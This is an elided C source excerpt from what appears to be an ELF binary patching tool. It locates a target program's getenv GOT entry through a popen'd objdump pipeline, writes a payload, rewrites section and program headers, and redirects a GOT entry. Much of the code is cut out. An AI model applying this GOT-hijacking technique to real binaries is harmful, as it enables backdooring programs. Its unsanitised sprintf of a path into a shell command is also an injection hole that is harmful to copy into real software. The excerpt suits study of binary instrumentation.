...
int main (int argc, char ** argv){
  ...
  char got_getenv[8];
  char command[1024];
  sprintf(command, "objdump -d %s | tail -n+$(objdump -d ./date | grep -n '<getenv@plt>:' | cut --delimiter=':' -f1) | head -n2 | tail -n1 | cut --delimiter='#' -f2 | cut --delimiter='<' -f1 | tr -d [:blank:]", arguments.args[0]);
  fp = popen(command, "r");
  fgets(got_getenv, sizeof(got_getenv)-1, fp);
  pclose(fp);
  ...
  if (strtol(arguments.args[4], NULL, 10)){
    ...
    write(payload, &to_write, 5);
    write(payload, &save, 6);
  }
  ...
  write(exec, mapped+index, elf_header->e_shentsize);
  ...
  lseek(exec, index, SEEK_SET);
  write(exec, mapped+index, elf_header->e_shentsize * elf_header->e_shnum);
  ...
  lseek(exec, index, SEEK_SET);
  write(exec, mapped+index, shstrtab->sh_size);
  ...
  lseek(exec, index, SEEK_SET);
  write(exec, mapped+index, elf_header->e_phentsize * elf_header->e_phnum);
  ...
  write(exec, mapped, elf_header->e_ehsize);

  if (!strtol(arguments.args[4], NULL, 10)){
    mod_got_entry(mapped, got_int, prg_header->p_vaddr);
    lseek(exec, got_int, SEEK_SET);
    write(exec, mapped+got_int, sizeof(int64_t));
  }
